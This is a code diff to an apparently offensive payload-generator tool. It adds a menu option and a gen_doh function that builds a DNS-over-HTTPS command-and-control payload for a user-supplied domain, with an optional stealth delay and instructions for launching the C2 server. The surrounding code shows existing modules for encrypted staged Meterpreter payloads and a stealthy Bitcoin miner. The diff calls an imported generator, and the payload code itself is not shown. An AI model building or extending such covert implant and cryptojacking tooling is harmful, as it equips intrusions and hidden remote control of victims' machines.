@@ -74,6 +74,11 @@ def display_menu():
     │  5. Create Encrypted Meterpreter (Staged)                                  │
     │     └─ Multi-stage web delivery with enhanced stealth                      │
     │                                                                             │
+    │  ══════════════════════════ DoH C2 Payloads ═════════════════════════════ │
+    │                                                                             │
+    │  6. Create DNS-over-HTTPS C2 Payload                                       │
+    │     └─ Stealthy DoH-based C2 with web UI                                    │
+    │                                                                             │
     └─────────────────────────────────────────────────────────────────────────────┘
     """
     print(menu)
@@ -305,6 +310,36 @@ def gen_btc_miner():
         print("[*] Stealth delay enabled (5-15 seconds)")
     print("[i] Monitor at: https://solo.ckpool.org/")
 
+def gen_doh():
+    """Generate DNS-over-HTTPS C2 payload."""
+    global name
+    from .generator import create_doh_payload
+    
+    print("\nDNS-over-HTTPS C2 Payload Generator")
+    print("─" * 45)
+    
+    name = "payload"
+    domain = get_user_input(
+        "Enter C2 domain name (e.g., example.com): ",
+        lambda x: len(x) > 0 and '.' in x,
+        "Invalid domain format"
+    )
+    
+    # Stealth delay option
+    stealth_delay = get_user_input(
+        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
+        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
+        "Please enter 'y' or 'n'"
+    ).lower() in ['y', 'yes']
+    
+    # Use centralized generator
+    create_doh_payload(domain, name, stealth_delay=stealth_delay)
+    
+    print(f"[+] DoH payload generated: {name}")
+    print(f"[*] C2 Domain: {domain}")
+    if stealth_delay:
+        print("[*] Stealth delay enabled (5-15 seconds)")
+
 def postgen():
     """Handle post-generation options."""
     global encrypted
@@ -442,9 +477,9 @@ def main():
         display_menu()
         
         choice = get_user_input(
-            "\n[?] Select module (1-5): ",
-            lambda x: x in ['1', '2', '3', '4', '5'],
-            "Please select a valid option (1-5)"
+            "\n[?] Select module (1-6): ",
+            lambda x: x in ['1', '2', '3', '4', '5', '6'],
+            "Please select a valid option (1-6)"
         )
         
         print(f"\n[*] Executing module {choice}...")
@@ -480,6 +515,12 @@ def main():
             webdelivery()
             start_web_server("webroot")
             start_listener()
+        
+        elif choice == '6':
+            gen_doh()
+            postgen()
+            print("\n[i] Start C2 server with: python -m osripper.c2.server <domain>")
+            print("[i] Web UI will be available at: http://localhost:5000")
         
         print("\n[+] Operation completed successfully!")
         print("[*] Check the 'results' directory for your files")
